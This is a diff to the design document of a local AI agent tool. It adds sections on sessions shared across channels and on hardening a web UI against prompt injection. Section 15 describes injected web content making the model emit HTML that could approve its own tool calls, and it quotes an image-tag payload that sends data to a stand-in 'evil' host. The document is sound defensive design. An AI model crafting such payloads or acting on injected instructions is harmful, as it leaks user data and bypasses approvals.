@@ -89,7 +89,7 @@ prompt or tool change can be judged on numbers.
 - Server-side refusal fallback (`fallbacks: "default"`) is a Claude beta, off by default. With
   `fallbacks=True` the loop uses the beta endpoint, and if the main model declines, the API
   retries on another model in the same call.
-- Non-streaming requests with `max_tokens=16000`; streaming is on the roadmap for the chat UI.
+- Non-streaming requests with `max_tokens=16000`; streaming is on the roadmap for the web UI.
 
 ## 10. Résumé: the source repo is read-only
 
@@ -162,3 +162,58 @@ sits behind a captcha anyway; the review before it is where the human catches wh
 couldn't know. The list errs towards refusing: a false "this is final" costs the user one
 click, a missed one could send a form they haven't checked. Approval is the second layer for
 buttons the list doesn't recognise.
+
+## 14. Sessions: one agent, many channels
+
+The terminal is one way in; a local web page, Telegram and a menu bar window are the others.
+None of them should know how the loop works, and a conversation started on one should be
+continuable on another, so the seam is the two callbacks the loop already had: listeners
+(events out) and the approver (a yes/no in).
+
+- **Stored the way it's built.** Sessions are rows in SQLite, and after each turn only the new
+  messages are written (`SessionStore.sync`). Since the loop never rewrites history, "the tail
+  since last time" is always the right diff. SDK blocks are stored as the dicts the API accepts
+  back, thinking signatures included, so a restored session sends the same prefix and the
+  provider's cache still hits. A test asserts that prefix holds across a save and restore.
+- **One manager, many channels.** `SessionManager` keeps one agent per session and runs each
+  turn on a worker thread, one turn at a time per session (a second message gets `Busy`, not a
+  tangled history). Every event is broadcast to every subscriber, so a turn started from the
+  phone shows up live in the browser. Errors become `error` events: a worker thread has no caller
+  to raise to.
+- **Approvals any channel can answer.** The approver posts an `approval_request` event and
+  blocks the agent's thread until some channel calls `resolve(id, allow)`. No answer in ten
+  minutes counts as no, which is the safe default for a side effect nobody is watching.
+- **Stopping is cooperative.** `cancel` takes effect at the next tool boundary: the model's
+  pending calls are not run, and the next turn answers them with "interrupted" results, the same
+  path as Ctrl-C in the terminal. A tool already running finishes; killing a thread mid-write
+  would be worse than waiting.
+
+## 15. The web UI: a page that renders text strangers influenced
+
+`solfish serve` is FastAPI, Server-Sent Events and one plain JavaScript file, with no build
+step. SSE rather than WebSockets because the traffic is one-way: events stream down, and the
+few things the page sends (a message, a decision, a stop) are ordinary POSTs. One stream carries
+every session's events, so the sidebar can show which sessions are working or waiting for an
+approval while you read another.
+
+The design problem is the page, not the server. It displays what the model wrote, and the model
+reads job posts, web pages and papers, so a page could carry a prompt injection that makes the
+model reply with HTML. On this page a script could approve its own tool calls. Several layers
+stop that:
+
+- **No raw HTML.** marked renders Markdown, but HTML in the model's text is escaped and shown
+  as text. DOMPurify sanitises the result anyway.
+- **Strict CSP.** Scripts only from this server and the pinned CDN, no inline handlers, and
+  images only from this server, so an injected `<img src="https://evil/?q=...">` can't send data
+  out. (In testing, DOMPurify's own parsing tripped an inline handler that the CSP blocked. That
+  is why there is more than one layer.)
+- **Token, then a cookie.** Only 127.0.0.1 is bound. `serve` prints a link with a random token
+  (kept in `~/.solfish/token`). The first visit turns it into an `HttpOnly`, `SameSite=Strict`
+  cookie and redirects, so the token leaves the address bar and another site can't send requests
+  that carry it. Scripts can send it as a Bearer header.
+- **Workspace files.** Downloads resolve inside the workspace or 404. PDFs, images and plain
+  text open inline. Anything else, HTML and SVG included, downloads as an attachment with
+  `nosniff`, so a model-written HTML file can't run on this origin.
+
+Replies arrive whole when the turn ends: requests aren't streamed yet (section 9). Thinking and
+tool calls already appear as they happen, which is where the waiting is.
